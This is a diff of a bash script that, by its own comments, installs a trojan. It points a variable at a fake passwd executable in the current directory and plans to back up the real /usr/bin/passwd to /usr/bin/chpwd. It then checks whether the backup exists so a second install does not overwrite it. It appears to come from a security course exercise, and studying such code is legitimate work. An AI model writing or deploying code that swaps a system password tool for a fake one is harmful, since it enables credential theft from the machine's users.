@@ -5,12 +5,15 @@
 # Author: Stefan Stockinger  #
 ##############################
 
-fake_passwd="/home/stocki/Schreibtisch/dev/syse/shell/passwd"
+#path to fake passwd executable (might needs to be adapted)
+fake_passwd="$PWD/passwd"
 
 real_passwd="/usr/bin/passwd"
 real_passwd_backup="/usr/bin/chpwd"
 
-#check if backup already exists (mean trojan already installed)
+
+# check if backup already exists (mean trojan already installed)
+# exit in this case, to avoid overriting of backuped real passwd
 if [[ -f "$real_passwd_backup" ]]
 then
     echo "exit: already installed"
